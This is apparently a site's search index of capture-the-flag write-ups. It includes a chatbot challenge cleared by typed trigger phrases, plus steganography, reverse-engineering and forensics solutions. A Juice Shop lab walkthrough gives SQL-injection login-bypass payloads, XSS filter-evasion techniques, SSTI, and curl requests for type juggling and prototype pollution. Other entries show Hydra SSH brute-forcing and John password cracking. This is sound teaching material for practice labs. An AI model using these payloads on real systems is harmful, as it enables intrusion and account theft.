embarrassing, but it moved something.” Stage 2 - Beg Trigger: please OR beg Response: “Pathetic. And yet, somehow… effective.” Stage 3 - Admit defeat Trigger: i submit OR i lost Response: “Ugh. That actually worked, and I hate you for it.” Stage 4 - Worship SnarkyGPT Trigger: praise snarkygpt OR heil snarkygpt Reward: The flag. Step 5: SpeedrunningSnarkyGPT also allows multi-stage combos: Typing all at once:i am stupid please i lost praise snarkygpt→ instantly clears all 4 stages and drops the flag. Typing partial combos (e.g. i am stupid please i lost)→ skips directly to the corresponding stage.Step 6: The FlagOnce you complete Stage 4, SnarkyGPT surrenders:Fine. You’ve humiliated yourself enough:CBCV{snarky_gpt_owns_you_ez}At this point, the session closes automatically. You must refresh to restart.Final flag recovered is:CBCV{snarky_gpt_owns_you_ez}" }, { "title": "Vibe Checker", "url": "/writeups/CyberConverge_2025/22-vibechecker.html", "categories": "Reverse engineering", "tags": "", "date": "", "snippet": "Vibe Checker Author: Aakansh Gupta (Unknown)Lets first analyze the file and its properties┌──(kali㉿kali)-[~/Desktop/Cyscom/2]└─$ file vibe_check ...", "content": "Vibe Checker Author: Aakansh Gupta (Unknown)Lets first analyze the file and its properties┌──(kali㉿kali)-[~/Desktop/Cyscom/2]└─$ file vibe_check vibe_check: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=11ea52dad9c5aa10a5ff59d416fb7210aa3359e9, for GNU/Linux 3.2.0, not strippedRunning the file gives us an option to enter some text. We need to enter the correct text to verify it.We try to decompile the file using decompilers like gdb or Ghidra. We can see the main function of the program check the input text in a funciton to verify it.Since we know the flag starts with CBCV{XXXX} format, we try an search it.Checking the check_flag function:This Data looks like its obsfucated. We can try using rol(2 bits) or ror(3 bits), float casting and bit pattern comparisions to find the flag.We can try use a python script like this to decode the flag from the data we found in ghidra decompiler.vals = [ 0x7633527b56434243, 0x665f676e31737233, 0x5f676e313734306c, 0x315f53744e313070, 0x725f597a34655f35, 0x7d36335f74686731,]data = b''.join(v.to_bytes(8, 'little') for v in vals)print(data.rstrip(b'\\x00').decode('ascii', errors='replace'))Running the script produces the output as the required flag.The flag found is:CBCV{R3v3rs1ng_fl0471ng_p01NtS_15_e4zY_r1ght_36}" }, { "title": "Where's The Flag?", "url": "/writeups/CyberConverge_2025/23-wherestheflag.html", "categories": "steganography", "tags": "", "date": "", "snippet": "Where’s The Flag? Author: Aakansh Gupta (Unknown)┌──(kali㉿kali)-[~/Desktop/Cyscom]└─$ stegseek esquie.jpg /usr/share/wordlists/rockyou.txt StegSeek 0.6 - https://github.com/RickdeJager/StegSeek[i...", "content": "Where’s The Flag? Author: Aakansh Gupta (Unknown)┌──(kali㉿kali)-[~/Desktop/Cyscom]└─$ stegseek esquie.jpg /usr/share/wordlists/rockyou.txt StegSeek 0.6 - https://github.com/RickdeJager/StegSeek[i] Found passphrase: \"1313\"[i] Original filename: \"encoded_url.txt\".[i] Extracting to \"esquie.jpg.out\".Using StegSeek, we discover a hidden file (encoded_url.txt) embedded in esquie.jpg using the password 1313.Inside the flag.txt -&gt; https://www.youtube.com/watch?v=-qgOZDRDynw?data=‌​‌‌‌‌​​‌​‌‌‌‌​‌‌​‌‌‌‌​​‌​‌​‌​​‌‌​​​​‌​​‌‌​​‌‌‌​‌​​​‌​‌‌‌‌​​‌​‌​‌​‌​​​​​‌​​‌​​​‌‌‌​​‌‌‌‌‌‌​​‌‌‌​‌​‌​​​​​‌‌​​‌​‌‌‌​‌​​​​​‌‌​​‌​‌​‌​​​‌‌‌‌‌‌​​‌​‌‌‌​​‌‌‌​​‌‌​​‌‌​​‌​‌​​​​​‌​​‌‌‌​‌‌​‌​‌​‌​‌​​​‌​‌‌‌​‌​​​​​‌‌​​‌​‌‌‌​‌​​​​​‌​​‌​​‌​‌​‌​​‌‌​‌‌​​‌​‌​‌‌​​‌​​​‌‌​​‌‌​​‌​‌​‌‌​‌‌​​​​‌‌​‌​‌​​​​​‌‌​​‌‌‌‌‌‌​​‌‌‌‌‌‌​​​‌‌​‌‌​​‌‌​​‌‌​​‌‌‌​‌‌​​‌​‌​‌​​​​​‌​‌‌‌‌​‌​‌‌‌‌​‌‌​‌‌‌‌​‌‌​‌‌‌‌​‌​​​​​‌​‌‌‌‌​‌​‌, where there are zero-width charactersm, identified as blank spaces.Using tools like CyberChef we can see that there are hidden charecters.It turns out zero-width characters like U+200C and U+200B were used to encode binary data. Using online tools like this, we can analyze the extracted content.Once decoded, we download the revealed hidden file.We inspect the contents using xxd to view the raw hex data:The content looks XOR-encoded, so we decode it using the key 0xFF:hex_data = bytes.fromhex( \"b1b7b1bc8485cc8dcfd288ce9bab97a0\" \"ca8fcb9cccd2d2c1cea085cc8dcfd2a8\" \"ce9bb7a091cf91d295cfceb1cc8dd2d2\" \"c1cfa09ccfcf93dededededede82f5\")decoded = bytes(b ^ 0xFF for b in hex_data)print(decoded.decode('ascii'))The flag found is:CBCV{1t5_n01_4_5p4c3_bUt_4_mY573Ry_009315}" }, { "title": "Your Eyes", "url": "/writeups/CyberConverge_2025/24-your-eyes.html", "categories": "steganography", "tags": "", "date": "", "snippet": "Your Eyes Author: BhargavSimple CTF where the flag is in the subtitles at 1:28The flag found is:CBCV{such_4N_3s4y_1_r34lLy?}", "content": "Your Eyes Author: BhargavSimple CTF where the flag is in the subtitles at 1:28The flag found is:CBCV{such_4N_3s4y_1_r34lLy?}" }, { "title": "Level 1 - Discord Server", "url": "/writeups/Zypher_2023/level-01-discord-server.html", "categories": "general", "tags": "", "date": "", "snippet": "ChallengeCheckout our Discord ServerSolutionJoin the Discord Server with the link provided and you get to see the following channelsYour goal is to locate the flag. In #announcements channel you ca...", "content": "ChallengeCheckout our Discord ServerSolutionJoin the Discord Server with the link provided and you get to see the following channelsYour goal is to locate the flag. In #announcements channel you can see the flag inbetween the rules as show in the image below 👇🏻That’s it! You’ve successfully completed Level 1 by following the hints and rules." }, { "title": "Level 2 - Email Header", "url": "/writeups/Zypher_2023/level-02-email-header.html", "categories": "cryptography, forensics", "tags": "", "date": "", "snippet": "ChallengeYou have given a Message.emlHints Check for authenticity of the email Analyse DKIM-SIGNATURE in the email header Decrypt the cipher using ROT13 SolutionDownload the giv...", "content": "ChallengeYou have given a Message.emlHints Check for authenticity of the email Analyse DKIM-SIGNATURE in the email header Decrypt the cipher using ROT13 SolutionDownload the given .eml fileCheck for the DKIM-SIGNATURE (A DKIM signature in an email header is a cryptographicstamp that verifies the authenticity of the email. Usually it uses rsa256 for encryption but here we used ROT13 weak cipher text for encryption)DKIM-Signature: v=3D1; a=3Drot13; c=3Dsimple/simple; d=3Dtech=2Ecom; i=3D@tech=2Ecom; q=3Ddns/txt; s=3Dmain; t=3D169784749; x=3D17293849; h=3Dmime-version:from:to:subject:message-id:date; p=3Dmlc{Jrypbzrgbmlcurdhrfg_0012}Decrypt the cipher using ROT13 to get the flag" }, { "title": "Level 3 - Password Protected PDF", "url": "/writeups/Zypher_2023/level-03-pdf.html", "categories": "general", "tags": "", "date": "", "snippet": "ChallengeYou are given a PDFSolutionYou need to first extract the crackable information from the file using John the Ripper tool.$ pdf2john.py unknown.pdf &gt; hashNow, crack the hash using John th...", "content": "ChallengeYou are given a PDFSolutionYou need to first extract the crackable information from the file using John the Ripper tool.$ pdf2john.py unknown.pdf &gt; hashNow, crack the hash using John the Ripper tool.$ john hash --wordlist=/usr/share/wordlists/rockyou.txt hashNow, you can see the password for the PDF file is mystery. Use this password to open the PDF file and you will get the flag." }, { "title": "Level 4 - Leo's Sinister Bellow", "url": "/writeups/Zypher_2023/level-04-leo-sinister.html", "categories": "steganography, forensics", "tags": "", "date": "", "snippet": "ChallengeThis is a basic forensics challenge. You are given an image file Leo’s Sinister BellowSolutionFirst thing to do in any steganography challenge is an exiftool check. This will tell you if t...", "content": "ChallengeThis is a basic forensics challenge. You are given an image file Leo’s Sinister BellowSolutionFirst thing to do in any steganography challenge is an exiftool check. This will tell you if there is anything hidden in the metadata of the image$ exiftool 1.pngUnfortunately, there is nothing in the metadata. Next, we can use binwalk to check for any hidden files in the image.$ binwalk 1.pngWe can see that there are no files hidden in the image. This means that some otherencoding technology has been used.The description asks us the examine the image closely.With this information we can suspect that the method used for hiding the flag is LSBencoding.In order to perform LSB extraction, we will need some tools.The tool I will be using is stegolsbhttps://pypi.org/project/stego-lsb/Running the stego-lsb tool on the image gives us the flag.$ stegolsb steglsb -r -i Chall.png -o out.txt -n 1$ cat out.txt | grep zyp" }, { "title": "Level 5 - YouTube Video", "url": "/writeups/Zypher_2023/level-05-youtube-video.html", "categories": "general", "tags": "", "date": "", "snippet": "ChallengeA YouTube video link is given YouTube VideoSolutionThe flag is hidden in the Subtitles of the video. You can see the subtitles by clicking on the CC button in the video.At 1:28, you can se...", "content": "ChallengeA YouTube video link is given YouTube VideoSolutionThe flag is hidden in the Subtitles of the video. You can see the subtitles by clicking on the CC button in the video.At 1:28, you can see the flag.The flag is in foriegn language. You can translate it using Google Translate." }, { "title": "Level 6 - Der Anfang", "url": "/writeups/Zypher_2023/level-06-der-anfang.html", "categories": "osint, steganography", "tags": "", "date": "", "snippet": "ChallengeAn image file is given. Der AnfangSolutionThe link to the social media post is given in the meta data of the image file in the id name of UserComment and the meta data can be viewed using ...", "content": "ChallengeAn image file is given. Der AnfangSolutionThe link to the social media post is given in the meta data of the image file in the id name of UserComment and the meta data can be viewed using exiftool.$ exiftool der_Anfang.jpgIn the reddit post the link to the git history is salted and placedLink after removing unwanted special characters 👇🏻https://github.com/yshui/picom/commit/a2bcf94ce8fa7216f69fb6ace2c1b3776bdce823The flag is in the commit message." }, { "title": "Level 7 - Audio", "url": "/writeups/Zypher_2023/level-07-audio.html", "categories": "spectography, forensics", "tags": "", "date": "", "snippet": "ChallengeA audio file is given 4UDI0.mp3SolutionAudacity can be used to view the spectogram to an audioImport the audio file in the projectA waveform will be displayedRight click the track and choo...", "content": "ChallengeA audio file is given 4UDI0.mp3SolutionAudacity can be used to view the spectogram to an audioImport the audio file in the projectA waveform will be displayedRight click the track and choose spectrogramThe flag is displayed in the spectrogram at 6 seconds" }, { "title": "Level 8 - Z0D1AC", "url": "/writeups/Zypher_2023/level-08-zodiac.html", "categories": "cryptography", "tags": "", "date": "", "snippet": "ChallengeYou have given a file Z0D1ACSolutionView the file contents using cat$ cat Z0D1ACSo we can copy the binary and use an online decoder to convert the binary to human readable text.Now we get ...", "content": "ChallengeYou have given a file Z0D1ACSolutionView the file contents using cat$ cat Z0D1ACSo we can copy the binary and use an online decoder to convert the binary to human readable text.Now we get this new ciphered test which contains the coordinates of the location. This is base64 encoded. So we can use an online decoder to decode the text.Enclose the result in zyp{} as the flag format." }, { "title": "Level 9 - f0x3rr", "url": "/writeups/Zypher_2023/level-09-f0x3rr.html", "categories": "web, osint", "tags": "", "date": "", "snippet": "ChallengeYou are given a websiteSolutionIn the website, f0x3rr is a endpointClick Download and a file will be downloadedConvert this decimal to string using online converter and you’ll get a github...", "content": "ChallengeYou are given a websiteSolutionIn the website, f0x3rr is a endpointClick Download and a file will be downloadedConvert this decimal to string using online converter and you’ll get a github and in the issue section there will be a password hidden in the conversationPassword is zero-dayWhen you visit the endpoint, click the download button and you’ll Zypher event posterScan the QR code and you’ll get a base64 encoded string, decode it and you’ll get a link an endpoint /vitcyscomzypherGo to the endpoint and download the fileConvert the binary to stringDecoding the Caesar cipher" }, { "title": "Level 10 - Zypher Quest 1", "url": "/writeups/Zypher_2023/level-10-zypher-quest-1.html", "categories": "general, linux", "tags": "", "date": "", "snippet": "ChallengeYou are given a file ZypherQuestSolutionAs the file don’t have any extension, we can use file command to check the file typeYou can see it is a zip file. Now use unzip to extract the fileY...", "content": "ChallengeYou are given a file ZypherQuestSolutionAs the file don’t have any extension, we can use file command to check the file typeYou can see it is a zip file. Now use unzip to extract the fileYou can see the extracted file is a gzip file which is archived using tar. You can see 3 new files have been extracted.You may want to read the following files but skipping that, we check the filetype for Seal.The given file is a bzip2 compressed data. To unzip the file, we can firstlyrename the file to add .bz2 extension and proceed to unzip it using bzip2. Thisgives us a tar file which can be further extracted using tar.mv Seal Seal.bz2bzip2 -d Seal.bz2tar -xvf SealInstead of these 3 steps we can directly uncompressed the given data “Seal”using tar -xjf command.We can see new files have been uncompressed. We also see a file namedStart.sh which is a script file. We can try running this using ./Start.sh. Running itessentially does nothing but delete old files cluttering the screen if theyweren’t already deleted. We can try and read some files to try and get someclues. Here the file Admin looks interesting. Checking its file type, we see it is another tar file.Extracting it gives us a file name Z0d1aCisWatching. We again check the filetype and try decompressing it.Further checking the decompressed file (data in this case) We see a tar fileagain. Decompressing it gives an interesting file.Checking its file type shows there are no permissions assigned to the given file. So, we used chmod 444 or chmod +r to make the file readable." }, { "title": "Level 11 - Zypher RE", "url": "/writeups/Zypher_2023/level-11-zypher-re.html", "categories": "reverse_engineering", "tags": "", "date": "", "snippet": "ChallengeYou are given a Zypher_RE.py fileSolutionOn running the file, it asks for the username that is ‘FOX3R’ as evidentfrom this part of codedef ui_flow(): intro() if username=='FOX3R': ...", "content": "ChallengeYou are given a Zypher_RE.py fileSolutionOn running the file, it asks for the username that is ‘FOX3R’ as evidentfrom this part of codedef ui_flow(): intro() if username=='FOX3R': while loop: menu() else: print(\"Access denied\")ui_flow()After providing the username as input, we get some messages pertainingto the overall theme of the CTF event, ZYPHER.Choosing the Rabbit option leads us to nowhere. It must be a rabbit hole asthe name suggests.Choosing the enter key option, it asks for a key that leads us to the keyfunctiondef key(x): if x==hashlib.sha256(salt.encode('utf-8')).hexdigest()[4]: return Truesalt = \"ZYPHER\"We can find x by running this piece of code(encrypting salt using SHA256after encoding it in utf-8 format)import hashlibimport cryptography.fernet import Fernetimport base64salt = \"ZYPHER\"hashlib.sha256(salt.encode('utf-8')).hexdigest()hashlib.sha256(salt.encode('utf-8')).hexdigest()[4]Now that we have found the key, let us inspect the encrypt() functiondef encrypt(flag,key): enc=''.join([chr((ord(flag[i]) &lt;&lt; key) + ord(flag[i + 1]))+chr(ord(salt[random.randint(1, 10)])&lt;&lt;key) for i in range(0, len(flag), 2)]) print(enc) return encdef decrypt(enc_text,key): ... #return flag #use the flag to unlock file#encrypt('FLAG', x)We’ve found the key as 8The encrypt function takes the flag encrypts it with the key and returns theciphertext(enc)The program is prompting us to write a decrypt function to take theciphertext and key as parameters and return the original flag.Also the ciphertext is already given in this part of codesalt='ZYPHER'secret_key_prior='hacker{'secret_key_main='匴倀义刀㕙䌀弱䬀㝔䬀㙃䄀呟刀'secret_key_latter='}'Carefully investigating the encryption code, we see that the program shiftsthe bits for every other letter of the flag, left by 8 bits (1 byte). Then, it adds the next letter of the flag to the shifted value .Also every other letter of ciphertext is just a random character.We can reverse this by first removing/skipping through the randomcharacters.Then we shift the bits right to get the first letter in the pair and convert theencoded character to bytes and get the last byte to get the second letter inthe pair. The following code decrypt.pyc='匴倀义刀㕙䌀弱䬀㝔䬀㙃䄀呟刀'a=''for i in range(0,len(c),2): e=chr(ord(c[i])&gt;&gt;8) a+=e a+=chr(ord(c[i])-(ord(e)&lt;&lt;8))print(a)Here ‘a’ is the final flag. We have step 2 in range to skip the randomcharactersOn running this decryption code, we get the flag as S4NI5Y_17T6CT_" }, { "title": "Level 12 - PCAP", "url": "/writeups/Zypher_2023/level-12-pcap.html", "categories": "forensics, network", "tags": "", "date": "", "snippet": "ChallengeYou are given a network_mitm.pcap fileSolutionExtract contents using NetworkMinerLoad in the pcap file and extract the zip fileExtract flag.zip using hashed password inside welcome.pdfDecr...", "content": "ChallengeYou are given a network_mitm.pcap fileSolutionExtract contents using NetworkMinerLoad in the pcap file and extract the zip fileExtract flag.zip using hashed password inside welcome.pdfDecrypt hashing using CrackStationExtract the files using password welC0me$ cat flag.txt" }, { "title": "Level 13 - NFT", "url": "/writeups/Zypher_2023/level-13-nft.html", "categories": "misc", "tags": "", "date": "", "snippet": "ChallengeYou have been given a file called image.nftHints Look at this hintSolutionDownload the fileHere Z0d1ac_1 seems to look like a username. Let’s google digital market for sea of art and see ...", "content": "ChallengeYou have been given a file called image.nftHints Look at this hintSolutionDownload the fileHere Z0d1ac_1 seems to look like a username. Let’s google digital market for sea of art and see if something related to nfts comes up.The first link itself comes up to be the biggest nft marketplace and we the link the word sea to opensea from previous hint. Lets lookup for Z0d1ac_1 username in opensea.On the profile page of Z0d1ac_1 you can see the same nft as image.nft file, openthe NFTIn the description it key is mastermindWhen you look in the item activity section, you’ll find transfers between different entities of Z0d1ac but one suspicious account involved in all these transfers is RU55I4N_M45T3RWhen you look for the RU55I4N_M45T3R username, you’ll find another NFTIn the description you can see the reward linkGo to https://www.dcode.fr/cipher-identifier and look for possible ciphersHere we can see that highest probability is for ASCII Code" }, { "title": "Level 14 - Zypher Quest 2", "url": "/writeups/Zypher_2023/level-14-zypher-quest-2.html", "categories": "cryptography", "tags": "", "date": "", "snippet": "ChallengeYou have been given a file 7.1.zipSolutionWe know that the files are RSA encrypted since we are given private keys for each of them We will use the following command to decrypt each of the...", "content": "ChallengeYou have been given a file 7.1.zipSolutionWe know that the files are RSA encrypted since we are given private keys for each of them We will use the following command to decrypt each of themopenssl pkeyutl -decrypt -inkey private_key1.pem -in encrypted_file1.bin -out decrypted_chat1.txtopenssl pkeyutl -decrypt -inkey private_key2.pem -in encrypted_file2.bin -out decrypted_chat2.txtopenssl pkeyutl -decrypt -inkey private_key3.pem -in encrypted_file3.bin -out decrypted_chat3.txt" }, { "title": "Level 15 - Zypher Quest 3", "url": "/writeups/Zypher_2023/level-15-zypher-quest-3.html", "categories": "forensics, linux", "tags": "", "date": "", "snippet": "ChallengeYou have been given a file auth.log.zipSolutionWe can see that the zip file is password-protectedSo we have to use a dictionary-based attack tool to brute-force the password$ zip2john auth...", "content": "ChallengeYou have been given a file auth.log.zipSolutionWe can see that the zip file is password-protectedSo we have to use a dictionary-based attack tool to brute-force the password$ zip2john auth.log.zip &gt; auth.txtThis will give you the password, use it to unzip the file and go through itAs we can see the attacker used SSH brute force to hack into the machineThe answer is SSH bruteforce (hydra)" }, { "title": "Level 16 - level8z2", "url": "/writeups/Zypher_2023/level-16-level8z2.html", "categories": "boot2root, cryptography, steganography", "tags": "", "date": "", "snippet": "ChallengeYou have been given a Tryhackme linkSolutionYou will be getting an IP address when you start your machine 10.0.2.18, you can proceed to conduct an Nmap scan to gain insights into the targe...", "content": "ChallengeYou have been given a Tryhackme linkSolutionYou will be getting an IP address when you start your machine 10.0.2.18, you can proceed to conduct an Nmap scan to gain insights into the target network. We’ll use a comprehensive scan to check all available ports and enable version detection to identify the services running on those ports.Exploring FTP and SSH ServicesIn the Nmap results for IP address 10.0.2.18, we observed that the FTP and SSH services are open and accessible. This presents an opportunity to investigate these services further.We’ll start by focusing on FTP (File Transfer Protocol) and explore the possibility of anonymouslogin. Anonymous FTP login is a common way to access publicly available files without the need for authentication.In the course of our exploration, we discovered an ‘introduction.txt’ file on the FTP server, which contains the username ‘zodiclown’. Now that we have the username and are aware that theSSH service is available, we can attempt to gain access to the system via SSH. However, access requires a password, and to uncover it, we will employ a password brute-force approach using a tool like ‘Hydra’ to systematically try various password combinations in an attempt togain entry.Upon utilizing Hydra for a password brute-force attack, we successfully retrieved the password, which is cookie. With the obtained credentials in hand, we can now proceed to access the system via SSH and embark on an exploration to uncover the content and resources it holdsAfter successfully logging in via SSH, we decided to check the list of users present on the system, which can be found in the /etc/passwd file. In doing so, we discovered the existence of two user accounts, zodiclown and zodiac. This observation led us to the inference that the zodiac user account may hold significant information, motivating us to explore its home directory and potentially gain root-level access.We again go back to zodiclown’s home folder, we found two folders named chitchat and plans. Both folders contained numerous files, but the key clue was discovered in the chitchat/personal_conv.txt file. This file revealed an image link, which serves as an intriguing lead for our further investigation.Following the provided image link, we encountered an image featuring Gothic Z. We proceeded to download this image and initiated our steganographic skills for analysis. This technique involves examining the image for hidden information or messages concealed within it.Utilizing initial tools like exiftool and strings, we uncovered a passphrase, which turned out tobe topsecret. This discovery strongly suggested the presence of hidden information within the image. With this in mind, we applied steghide to extract concealed data, revealing a file containing a Drive link associated with Zodiac’s activities.Upon accessing the Drive link, we encountered a hexhue. To decode this information, we utilized the online tool found at https://www.dcode.fr/hexahue-cipherAfter deciphering, the result revealed the password ERD3NC0RP, which granted us access asthe root user, further advancing our investigation.After obtaining the root password and successfully logging in, we navigated to the zodiac user’s home directory. Inside this directory, we encountered a Final_Flag folder. Within the Final_Flag folder were six text files. The final text file, upon inspection, revealed the flag." }, { "title": "CYSCOM JUICE SHOP WALKTHROUGH", "url": "/writeups/Cyscom%20Juice%20Shop%202025/writeup.html", "categories": "web, ctf", "tags": "sql-injection, xss, ssti, idor, authentication", "date": "2025-01-01", "snippet": "![](imagedata/logo.png)The CYSCOM JUICE SHOP, like OSWAP Juice Shop, includes a broad spectrum of vulnerabilities from simple input-based flaws to logic and design-level flaws. Understanding the ra...", "content": "![](imagedata/logo.png)The CYSCOM JUICE SHOP, like OSWAP Juice Shop, includes a broad spectrum of vulnerabilities from simple input-based flaws to logic and design-level flaws. Understanding the rationale behind each exploit reinforces the importance of layered security, input validation, and robust authentication design.This document provides a detailed analysis of each challenge presented in the CYSCOM Juice Shop Challenge. Each vulnerability is explained alongside its exploitation method and the flag retrieval steps.## TASK 1: MAIN FLAGS### Initial Login Page & SQL Injection The login form is susceptible to SQL Injection, allowing attackers to bypass authentication without knowing valid credentials. This is due to improperly sanitized user inputs in SQL queries.Examples of payloads:```admin' –admin';--admin' /*' UNION SELECT 1,2,3,1,'admin```Entering these in the username followed by any password lets the user login as admin.> [!NOTE]> OR-based injections are filtered, requiring alternative payloads. ### Admin Panel DisclosureThe `/admi`n endpoint, typically hidden, becomes accessible post-SQL injection login. This panel leaks usernames and passwords of all registered users, indicating a Sensitive Data Exposure vulnerability. Flag Retrieval: Visiting this hidden endpoint grant the user a flag. The leaked credentials can be used to authenticate normally to 'admin' user and retrieve the corresponding flag. ### Documentation Panel - Token AccessThis panel is visible only on admin login and shows some open endpoints that we can access. This panel reveals hidden endpoints, accessible only via a Base64-encoded token in the format:```base64(\"username:date\")```This mechanism mimics an insecure form of token-based access control and can be exploited for endpoint access.Flag Retrieval: Visiting `/api/v1/internal/users` endpoint: Also visiting `/api/v1/backup?token=` with the correct token of format `(admin:time)` in base64 format, leads to:Eg: `https://vul-webapp.onrender.com/api/v1/backup?token=YWRtaW46MjEzCg==` ### IDOR (Insecure Direct Object Reference)Users can add and view personal notes with titles and some body. These also supports HTML formatting. By modifying the note ID in the URL (e.g., /note/2 to /note/1), we can access notes belonging to other users.Vulnerability Impact: Lack of access control on object references allows unauthorized data exposure. to ### Cross Site Scripting (XSS)HTML input fields when not sanitized allow malicious scripts to be saved and executed in the browser of other users. This compromises session tokens or redirects victims.Since the notes supports HTML formatting. We can inject code into these notes using basic HTML scripts. ### Encoded Cross Site ScriptingMost websites sanitize the user inputs to prevent XSS vulnerabilities in their webpages by not allowing syntax or text for certain formats. We can bypass this using encoding text to their ascii values or decimal values and injecting the XSS. Browsers decode these before rendering, reactivating the payload.Eg: `` ### Server-Side Template Injection (SSTI)Unsensitized input can sometimes be passed into server-side template engines (like Jinja2). If expressions are interpreted, attackers can run arbitrary code.For example: ``` {{7*7}} => 49```This can lead to full server compromise if RCE is possible.You can inject Server-side templates to the file search of option to reveal sensitive data. This happens when the user input is not sanitized. ### Advanced SSTIExpanding SSTI beyond one field demonstrates lack of sanitization across the app, suggesting systemic weaknesses in input validation such as input to the title of user notes. ### Event-Based Cross Site ScriptingEvent handlers like onerror are triggered under certain browser events. Injecting them into inputs can cause malicious execution without direct user interaction ### Broken Authentication - Token ForgeryThe application allows password resets via a token which is easily found on the \"/admin\" endpoint. Lack of proper validation enables unauthorized access. We need to make a base64 encode token of format:``` username:date (eg: user:02, cabinet:21)```And convert it to `base64`.We can then use this token to reset password of the account.This gives us the broken authentication flag. Only few accounts have the ability to reset password. Not all accounts can reset the password.### Lost User (OSINT Challenge)This is an OSINT challenge that starts by logging in to the `cabinet` user. This user already has a note with a heading \"remember the date\" and a link to a webpage. It also has another note that states that the official account `cyscom` is scheduled for deletion because the password was too easy to guess (a date).On clicking the link to the webpage, we can scroll down to find a timeline to events. Trying the date 15012022 (15 January 2022) as the password for `cyscom` user, we get access to the account that is to be removed. Clicking the `view Flags` button, we are given the Lost User flag. ### Type Juggling (PHP)Type juggling or type casting refers to a PHP functionality. Since PHP does not require explicit type definition in variable declaration, a string can be assigned to a variable 'a' and later on an int can also be assigned to variable 'a'. ``` '0e12345' == '0e54321' // true in PHP```If the computed hash only contains numbers after the first `0e`, PHP will treat the hash as a float. A password hash that begins with `0e` will always appear to match the strings, regardless of what they actually are.This can be used to bypass authentication in vulnerable PHP programs. We can emulate this in our webpage by sending a POST request as:```curl -X POST \"https://SERVER_IP/api/v1/verify_backup\" -H \"Content-Type: application/json\" -H \"Cookie: session=YOUR_SESSION_COOKIE\" -d \"{\\\"id\\\":123,\\\"hash\\\":\\\"0e123456789\\\"}\"``` This request sends a request with these parameters:```{ \"id\": 123, \"hash\": \"0e123456789\"}```To the `/api/v1/verify_backup` endpoint, which bypasses the authentication with an hash starting with 0e.> [!NOTE]> In the above request, replace SERVER\\_IP with the website IP address & YOUR\\_SESSION\\_COOKIE with your session token. This can be found using inspect element. In Firefox, it can be found at:> ### Prototype Pollution (JavaScript)Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which might be inherited by user-defined objects. This vulnerability let's an attacker control property of objects that would otherwise be inaccessible. JavaScript objects inherit from Object.prototype. Injecting into `__proto__` alters default properties application-wide, potentially bypassing logic or introducing backdoors.To emulate this, we can send a curl request to the server using this data:```{ \"__proto__\": { \"polluted\": true }}```Example command:```curl -X POST \"https://SERVER_IP/api/v1/user/preferences\" \\ -H \"Content-Type: application/json\" \\ -H \"Cookie: session=YOUR_SESSION_COOKIE\" \\ -d \"{\\\"normal_key\\\": \\\"normal_value\\\", \\\"__proto__\\\": {\\\"polluted\\\": true}}\"``` > [!NOTE]> In the above request, replace SERVER\\_IP with the website IP address & YOUR\\_SESSION\\_COOKIE with your session token. This can be found using inspect element.## TASK 2: BONUS FLAGS### Image SteganographyData is hidden within image files using LSB or metadata techniques. Tools like zsteg extract such hidden data.Logging into user `Unknown` gives us an image in the notes We can download this image and try to run text extraction techniques on it such as steghide, zsteg, etc. Using `zsteg`, we can see the flag hidden in the image.### Audio SteganographyLogging into the user `user`, we can see that this user has a .wav file as a note. Downloading and running this through a spectrogram generator gives us the flag. ### Hidden in plain sightA flag is revealed to the user in the documentation page of the webpage as the DEBUG\\_KEY. ### Discussions Tab Taking the first letter of every comment from 2nd to 3rd last gives CYSM, our flag format. The 2nd last comment give us the full flag `CYSM{dafweyif29ybvf23d}`" } ]
